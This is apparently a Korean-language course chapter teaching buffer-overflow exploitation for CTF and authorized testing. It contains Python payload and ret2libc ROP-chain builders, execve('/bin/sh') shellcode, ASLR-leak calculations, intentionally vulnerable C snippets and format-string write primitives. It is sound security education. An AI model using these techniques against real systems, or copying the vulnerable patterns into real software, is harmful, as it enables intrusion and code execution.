# 버퍼 오버플로우

**이전**: [09. 바이너리 기초](./09_Binary_Fundamentals.md) | **다음**: [11. 리버스 엔지니어링](./11_Reverse_Engineering.md)

---

버퍼 오버플로우(buffer overflow) 취약점은 1988년 모리스 웜(Morris Worm) 이후 익스플로잇의 초석이었다. ASLR, DEP/NX, 스택 카나리(stack canary) 등 수십 년간의 완화 기술에도 불구하고, 버퍼 오버플로우는 임베디드 시스템, 레거시 소프트웨어에서 여전히 유효하며, ROP(Return-Oriented Programming)와 같은 현대적 익스플로잇 기법의 기초를 이해하는 데 필수적이다.

> **중요**: 바이너리 익스플로잇 기술은 CTF 대회, 승인된 보안 평가, 개인 실습 환경에서만 적용해야 한다.

**난이도**: ⭐⭐⭐⭐

## 학습 목표

1. 버퍼 오버플로우가 스택 메모리를 어떻게 손상시키는지 이해한다
2. 반환 주소를 덮어쓰는 페이로드를 작성한다
3. 기본적인 셸코드를 작성하고 주입한다
4. ROP를 사용하여 NX/DEP를 우회한다
5. ASLR과 이를 무력화하는 기법을 이해한다
6. 포맷 스트링(format string) 취약점을 익스플로잇한다
7. 여러 기법을 결합한 완전한 익스플로잇 체인을 구축한다
8. pwntools를 사용하여 익스플로잇을 개발한다

---

## 목차

1. [스택 버퍼 오버플로우 기초](#1-스택-버퍼-오버플로우-기초)
2. [명령 포인터 제어](#2-명령-포인터-제어)
3. [셸코드 작성](#3-셸코드-작성)
4. [NX/DEP 보호 및 우회](#4-nxdep-보호-및-우회)
5. [ROP (Return-Oriented Programming)](#5-rop-return-oriented-programming)
6. [ASLR 및 정보 유출](#6-aslr-및-정보-유출)
7. [스택 카나리](#7-스택-카나리)
8. [포맷 스트링 취약점](#8-포맷-스트링-취약점)
9. [힙 익스플로잇 기초](#9-힙-익스플로잇-기초)
10. [현대적 완화 기술](#10-현대적-완화-기술)
11. [연습 문제](#11-연습-문제)
12. [요약](#12-요약)
13. [참고 자료](#13-참고-자료)

---

## 1. 스택 버퍼 오버플로우 기초

### 1.1 취약점

버퍼 오버플로우는 프로그램이 할당된 버퍼 경계를 넘어 데이터를 쓸 때 발생하며, 인접한 메모리를 손상시킨다.

```c
// VULNERABLE CODE
void vulnerable_function(char *input) {
    char buffer[64];       // 64-byte buffer on the stack
    strcpy(buffer, input); // No bounds checking!
    // If input > 64 bytes, overflows into saved RBP and return address
}
```

### 1.2 오버플로우 시 스택 레이아웃

```
Before overflow:              After overflow:
┌─────────────────┐          ┌─────────────────┐
│ Return Address   │          │ AAAA (overwritten)│ ← Controlled!
├─────────────────┤          ├─────────────────┤
│ Saved RBP        │          │ AAAA (overwritten)│
├─────────────────┤          ├─────────────────┤
│ buffer[56..63]   │          │ AAAAAAAA         │
│ ...              │          │ ...              │
│ buffer[0..7]     │          │ AAAAAAAA         │
└─────────────────┘          └─────────────────┘
```

```python
"""
Buffer overflow exploit development framework.

Provides utilities for crafting buffer overflow exploits
in CTF competitions and authorized security testing.
"""

import struct
from dataclasses import dataclass, field
from typing import Optional


@dataclass
class ExploitConfig:
    """Configuration for a buffer overflow exploit."""
    buffer_size: int
    offset_to_rip: int  # Bytes from buffer start to return address
    target_address: int  # Address to redirect execution
    arch: str = "x64"  # x86 or x64
    endianness: str = "little"
    bad_chars: bytes = b"\x00"  # Null bytes usually bad

    def pack_address(self, addr: int) -> bytes:
        """Pack an address in the correct format."""
        if self.arch == "x64":
            return struct.pack("<Q", addr)
        return struct.pack("<I", addr)


def create_pattern(length: int) -> bytes:
    """
    Create a cyclic pattern for finding offsets.

    Similar to msf-pattern_create / cyclic from pwntools.
    Each 4-byte subsequence is unique, allowing you to
    find the exact offset to any overwritten value.
    """
    pattern = b""
    for upper in range(ord('A'), ord('Z') + 1):
        for lower in range(ord('a'), ord('z') + 1):
            for digit in range(ord('0'), ord('9') + 1):
                pattern += bytes([upper, lower, digit])
                if len(pattern) >= length:
                    return pattern[:length]
    return pattern[:length]


def find_pattern_offset(pattern: bytes, value: bytes) -> int:
    """Find the offset of a value within a cyclic pattern."""
    # Handle little-endian 4-byte values
    idx = pattern.find(value)
    if idx >= 0:
        return idx
    # Try reversed (big-endian interpretation)
    idx = pattern.find(value[::-1])
    return idx


def build_exploit(config: ExploitConfig) -> bytes:
    """
    Build a basic buffer overflow payload.

    Structure:
    [padding][return_address]

    The padding fills the buffer up to the return address,
    then the return address redirects execution to our target.
    """
    padding = b"A" * config.offset_to_rip
    ret_addr = config.pack_address(config.target_address)

    # Verify no bad characters
    for char in config.bad_chars:
        if bytes([char]) in ret_addr:
            raise ValueError(
                f"Bad character 0x{char:02x} found in return address"
            )

    return padding + ret_addr


def build_rop_chain(
    config: ExploitConfig,
    gadgets: list[int],
) -> bytes:
    """
    Build a ROP chain payload.

    Structure:
    [padding][gadget1][gadget2]...[gadgetN]
    """
    padding = b"A" * config.offset_to_rip
    chain = b""
    for gadget in gadgets:
        chain += config.pack_address(gadget)
    return padding + chain


if __name__ == "__main__":
    print("Buffer Overflow Exploit Framework")
    print("=" * 50)

    # Generate cyclic pattern
    pattern = create_pattern(200)
    print(f"Cyclic pattern (200 bytes): {pattern[:50]}...")

    # Example: find offset
    # After crash, EIP/RIP contains "6Aa7"
    crash_value = b"6Aa7"
    offset = find_pattern_offset(pattern, crash_value)
    print(f"Offset of '{crash_value.decode()}' in pattern: {offset}")

    # Build exploit
    config = ExploitConfig(
        buffer_size=64,
        offset_to_rip=72,  # 64 buffer + 8 saved RBP
        target_address=0x00401234,
        arch="x64",
    )
    payload = build_exploit(config)
    print(f"\nExploit payload ({len(payload)} bytes):")
    print(f"  Padding: {config.offset_to_rip} bytes")
    print(f"  Target: 0x{config.target_address:016x}")
```

---

## 2. 명령 포인터 제어

### 2.1 오프셋 찾기

```bash
# Method 1: Cyclic pattern (pwntools)
python3 -c "from pwn import *; print(cyclic(200))"
# Run program with pattern, note crash value
python3 -c "from pwn import *; print(cyclic_find(0x61616167))"  # Returns offset

# Method 2: Metasploit pattern
msf-pattern_create -l 200
msf-pattern_offset -q <crash_value>
```

### 2.2 실행 흐름 리디렉션

RIP/EIP를 제어하게 되면, 다음으로 리디렉션할 수 있다:

- **ret2win**: 바이너리에 존재하는 함수로 점프
- **ret2shellcode**: 주입된 셸코드로 점프 (실행 가능한 스택 필요)
- **ret2libc**: libc 함수로 점프 (system, execve)
- **ROP**: 가젯(gadget)을 체이닝하여 임의 연산 수행

---

## 3. 셸코드 작성

### 3.1 기본 x86-64 Linux 셸코드

```nasm
; execve("/bin/sh", NULL, NULL) — 27 bytes
; System call number for execve: 59 (0x3b)

section .text
global _start
_start:
    xor rsi, rsi        ; rsi = 0 (argv = NULL)
    xor rdx, rdx        ; rdx = 0 (envp = NULL)
    push rsi             ; null terminator
    mov rdi, 0x68732f6e69622f  ; "/bin/sh" in little-endian
    push rdi
    mov rdi, rsp         ; rdi = pointer to "/bin/sh"
    mov al, 59           ; syscall number for execve
    syscall
```

### 3.2 셸코드 제약 조건

- **널 바이트 금지**: `\x00`은 C 문자열을 종료한다 (XOR로 레지스터 초기화)
- **개행 문자 금지**: `\x0a`는 줄 기반 입력을 종료한다
- **크기 제한**: 셸코드는 사용 가능한 버퍼 공간에 맞아야 한다
- **문자 제한**: 일부 입력은 인쇄 불가능한 문자를 필터링한다

---

## 4. NX/DEP 보호 및 우회

**NX(No-eXecute) / DEP(Data Execution Prevention)**는 메모리 페이지를 실행 불가로 표시하여 스택이나 힙에서의 직접적인 셸코드 주입을 방지한다.

### 4.1 NX 작동 방식

```
Without NX:                    With NX:
Stack: rwx (read/write/exec)   Stack: rw- (read/write only)
Heap:  rwx                     Heap:  rw-
Code:  r-x                     Code:  r-x
```

### 4.2 NX 우회

스택에서 코드를 실행할 수 없으므로, 이미 존재하는 코드를 사용한다:

1. **ret2libc**: libc의 `system("/bin/sh")` 호출
2. **ROP**: 기존 코드 조각(가젯)을 체이닝
3. **mprotect**: 메모리 영역을 실행 가능하게 만든 후 셸코드로 점프

---

## 5. ROP (Return-Oriented Programming)

ROP는 `ret`로 끝나는 짧은 명령어 시퀀스인 "가젯(gadget)"을 체이닝하여 임의 연산을 수행한다.

### 5.1 ROP 가젯

```nasm
; Example gadgets found in a binary:
pop rdi; ret          ; Load a value into RDI
pop rsi; ret          ; Load a value into RSI
pop rdx; ret          ; Load a value into RDX
mov rdi, rax; ret     ; Move RAX to RDI
syscall; ret          ; Execute system call
```

### 5.2 ROP 체인 구축

```python
"""
ROP chain builder using pwntools-compatible syntax.

Demonstrates how to chain gadgets for calling system("/bin/sh")
with NX enabled.
"""

from dataclasses import dataclass
import struct


@dataclass
class ROPGadget:
    """A ROP gadget with its address and description."""
    address: int
    instructions: str
    description: str = ""


def build_ret2libc_chain(
    pop_rdi_ret: int,
    bin_sh_addr: int,
    system_addr: int,
    ret_gadget: int = 0,
) -> bytes:
    """
    Build a ret2libc ROP chain to call system("/bin/sh").

    Stack layout after overflow:
    [pop rdi; ret]  ← first gadget
    ["/bin/sh" addr] ← popped into RDI
    [system() addr]  ← called with RDI = "/bin/sh"
    """
    chain = b""

    # Stack alignment (needed on Ubuntu/x64 for movaps in system())
    if ret_gadget:
        chain += struct.pack("<Q", ret_gadget)

    # pop rdi; ret — load address of "/bin/sh" into RDI
    chain += struct.pack("<Q", pop_rdi_ret)
    chain += struct.pack("<Q", bin_sh_addr)

    # Call system()
    chain += struct.pack("<Q", system_addr)

    return chain


def find_gadgets_example():
    """Demonstrate how to find gadgets using ROPgadget."""
    print("Finding ROP gadgets:")
    print("  $ ROPgadget --binary ./vuln | grep 'pop rdi'")
    print("  $ ROPgadget --binary ./vuln | grep 'pop rsi'")
    print("  $ ROPgadget --binary ./vuln | grep 'ret$'")
    print("  $ ropper -f ./vuln --search 'pop rdi'")
    print()
    print("Common tool: ROPgadget, ropper, or pwntools' ROP()")


if __name__ == "__main__":
    print("ROP Chain Builder")
    print("=" * 50)
    find_gadgets_example()

    # Example chain (addresses would come from binary analysis)
    chain = build_ret2libc_chain(
        pop_rdi_ret=0x401234,
        bin_sh_addr=0x7ffff7d8d698,
        system_addr=0x7ffff7c50d60,
        ret_gadget=0x40101a,
    )
    print(f"\nROP chain ({len(chain)} bytes):")
    for i in range(0, len(chain), 8):
        addr = struct.unpack("<Q", chain[i:i+8])[0]
        print(f"  0x{addr:016x}")
```

---

## 6. ASLR 및 정보 유출

**ASLR(Address Space Layout Randomization)**은 매 실행 시 메모리 주소를 랜덤화하여 ROP 체인이나 셸코드의 주소를 예측할 수 없게 만든다.

### 6.1 ASLR 무력화

- **정보 유출(information leak)**: 런타임 주소를 유출하여 베이스 주소 계산
- **부분 덮어쓰기(partial overwrite)**: 변하지 않는 하위 바이트만 덮어쓰기
- **브루트 포스**: 32비트 시스템에서는 8~16비트의 랜덤화만 존재
- **포맷 스트링**: %p를 사용하여 스택/GOT 주소 유출

### 6.2 주소 유출

```python
"""
Demonstrates how to use information leaks to defeat ASLR.
"""

import struct


def calculate_libc_base(leaked_addr: int, known_offset: int) -> int:
    """
    Calculate libc base from a leaked address.

    If we leak the address of puts() from the GOT, and we know
    the offset of puts() within libc, we can calculate the base.
    """
    return leaked_addr - known_offset


def calculate_target(base: int, target_offset: int) -> int:
    """Calculate target function address from base + offset."""
    return base + target_offset


if __name__ == "__main__":
    # Example: leaked puts() address
    leaked_puts = 0x7f1234567890
    puts_offset = 0x80e50  # Offset of puts in libc

    libc_base = calculate_libc_base(leaked_puts, puts_offset)
    system_offset = 0x50d60  # Offset of system in libc
    system_addr = calculate_target(libc_base, system_offset)

    print(f"Leaked puts:    0x{leaked_puts:016x}")
    print(f"libc base:      0x{libc_base:016x}")
    print(f"system() addr:  0x{system_addr:016x}")
```

---

## 7. 스택 카나리

스택 카나리(stack canary)는 지역 변수와 반환 주소 사이에 랜덤 값을 배치한다. 카나리가 덮어쓰여지면 프로그램이 중단된다.

### 7.1 카나리 우회 기법

- **카나리 유출**: 포맷 스트링이나 정보 공개를 통해 유출
- **브루트 포스**: 포킹(forking) 서버에서는 포크마다 카나리가 변하지 않는다
- **접촉 없이 덮어쓰기**: 카나리를 건드리지 않고 특정 데이터를 타겟팅

---

## 8. 포맷 스트링 취약점

```c
// VULNERABLE — user controls format string
printf(user_input);           // Attacker can use %x, %p, %n

// SAFE — format string is hardcoded
printf("%s", user_input);     // User input treated as data
```

### 8.1 포맷 스트링 익스플로잇

```
%x     — Read stack values (hex)
%p     — Read stack pointers
%s     — Read string at stack address
%n     — Write number of bytes printed to address on stack
%99c   — Print 99 characters (control %n writes)
```

---

## 9. 힙 익스플로잇 기초

### 9.1 일반적인 힙 취약점

- **Use-After-Free (UAF)**: 해제된 후의 메모리에 접근
- **Double Free**: 같은 청크를 두 번 해제하여 할당자 메타데이터 손상
- **힙 오버플로우(Heap Overflow)**: 인접한 힙 청크로 오버플로우
- **초기화되지 않은 사용(Uninitialized Use)**: 초기화 없이 힙 메모리 사용

---

## 10. 현대적 완화 기술

| 완화 기술 | 목적 | 우회 난이도 |
|-----------|---------|-------------------|
| NX/DEP | 스택/힙에서 코드 실행 방지 | 중간 (ROP) |
| ASLR | 메모리 레이아웃 랜덤화 | 중간 (정보 유출) |
| 스택 카나리 | 스택 덮어쓰기 감지 | 중간 (유출/브루트 포스) |
| PIE | 코드 세그먼트 랜덤화 | 중간 (정보 유출) |
| RELRO | GOT 덮어쓰기 보호 | 높음 (Full RELRO) |
| CFI | 제어 흐름 무결성(Control Flow Integrity) | 높음 |
| Shadow Stack | 하드웨어 기반 반환 주소 보호 | 매우 높음 |

---

## 11. 연습 문제

1. **패턴 오프셋**: 취약한 바이너리에서 순환 패턴(cyclic pattern)을 사용하여 RIP까지의 정확한 오프셋을 찾는다.
2. **ret2win**: `win()` 함수가 있는 바이너리에서 반환 주소를 덮어써서 익스플로잇한다.
3. **ret2libc**: `system("/bin/sh")`를 호출하는 ret2libc 체인을 구축하여 NX를 우회한다.
4. **ROP 체인**: NX가 활성화되고 흥미로운 함수가 없는 바이너리에 대해 전체 ROP 체인을 구축한다.
5. **ASLR 우회**: 먼저 libc 주소를 유출한 다음 ASLR이 적용된 바이너리를 익스플로잇한다.
6. **포맷 스트링**: 포맷 스트링 취약점을 사용하여 스택 카나리를 읽은 다음, 버퍼 오버플로우를 익스플로잇한다.

---

## 12. 요약

버퍼 오버플로우 익스플로잇은 공격적 보안의 기초이다:

- **스택 오버플로우**는 반환 주소를 손상시켜 실행 흐름을 리디렉션한다
- **셸코드**는 스택이 실행 가능할 때 직접 코드 실행을 제공한다
- **NX/DEP**는 스택 실행을 방지한다; ROP와 ret2libc로 우회한다
- **ROP**는 기존 코드의 가젯을 체이닝하여 튜링 완전한 익스플로잇을 구성한다
- **ASLR**은 주소를 랜덤화한다; 정보 유출을 통해 무력화한다
- **스택 카나리**는 덮어쓰기를 감지한다; 유출이나 브루트 포스로 무력화한다
- **포맷 스트링**은 임의 메모리의 읽기와 쓰기를 모두 가능하게 한다

---

## 13. 참고 자료

- Smashing the Stack for Fun and Profit (Aleph One): https://phrack.org/issues/49/14.html
- ROP Emporium: https://ropemporium.com/
- pwntools: https://docs.pwntools.com/
- Nightmare (Binary Exploitation Course): https://guyinatuxedo.github.io/
- LiveOverflow Binary Exploitation: https://www.youtube.com/playlist?list=PLhixgUqwRTjxglIswKp9mpkfPNfHkzyeN
